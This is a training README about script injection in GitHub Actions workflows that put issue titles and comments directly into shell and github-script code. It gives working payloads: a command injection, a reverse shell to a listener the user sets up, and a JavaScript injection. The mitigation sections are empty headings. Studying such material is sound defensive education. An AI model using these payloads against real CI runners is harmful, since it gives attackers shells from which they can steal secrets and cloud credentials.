# workflow-script-injection

The [Check issue title](.github/workflows/check-issue-title.yml) workflow simply checks if the title of the workflow begins with `octocat`. If so, the workflow succeeds. If not, the workflow fails.

The [Check issue comment](.github/workflows/check-issue-comment.yml) workflow simply checks if the issue comment begins with `octocat`. If so, the workflow succeeds. If not, the workflow fails.

These workflows are vulnerable to script injection. Let's find out why.

## Exercise 1 - Script injection in the run command
The [Check issue title](.github/workflows/check-issue-title.yml) workflow uses the issue title in the `run` command as follows:
```
title="${{ github.event.issue.title }}"
```
This provides an opportunity for an attacker to exploit the workflow with an issue titled `octocat"; ls -l $GITHUB_WORKSPACE"`. Using this title, the script looks like the following...
```
title="octocat"; ls -l $GITHUB_WORKSPACE"
```

Let's create a new issue with this title and see what happens. We observe that the workflow runs the command `ls -l $GITHUB_WORKSPACE`!

Ok. Big deal. So we were able to see what is in the workspace directory. Who cares?  
Now let's try something a little more sinister...

## Exercise 2 - Getting a shell on the runner
Spin up a linux vm in the cloud that has a public IP address. Login and run `nc -nvlp 1337`. Then open a new issue with the title `octocat"; bash -i >& /dev/tcp/<YOUR-VM-IP-ADDRESS>/1337 0>&1 ; ls -l $GITHUB_WORKSPACE"`  

Now I have a shell on the runner! This is a great "foot in the door" from which I can attemp other exploits, like dumping secrets or cloud credentials to use in other attacks.  

## Exercise 3 - Script injection in github-script action
The [Check issue comment](.github/workflows/check-issue-comment.yml) workflow uses issue comment body in the [github-script actions](https://github.com/actions/github-script) as follows:
```
const comment="${{ github.event.comment.body }}"
```
This provides an opportunity for an attacker to exploit the workflow with an issue comment `octocat";console.log('WTF!!!');//`. Using this title, the script looks like the following...
```
const comment="octocat";console.log('WTF!!!');//"
```

Let's create a new issue comment with this body and see what happens. We observe that the workflow runs the command `console.log('WTF!!!');//`!

## Exercise 4 - Mitigate script injection in the run command


## Exercise 5 - Migrate script injection in github-script action


## Exercise 6 - Mitigate by using a github action
